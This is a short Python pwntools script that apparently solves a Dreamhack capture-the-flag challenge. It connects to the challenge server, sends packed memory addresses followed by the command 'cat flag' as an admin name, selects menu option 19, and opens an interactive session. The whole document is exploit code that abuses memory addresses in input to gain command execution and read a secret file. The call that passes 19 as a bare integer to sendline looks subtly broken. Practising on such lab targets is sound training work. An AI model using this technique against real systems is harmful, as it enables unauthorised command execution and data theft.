from pwn import *

r = remote("host1.dreamhack.games", 10648)
name = p32(0x0804a0ac)
command = p32(0x0804a060)
r.recvuntil("Admin name:")
r.sendline(name + b"cat flag")
r.recvuntil("What do you want?:")
r.sendline(19)
r.interactive()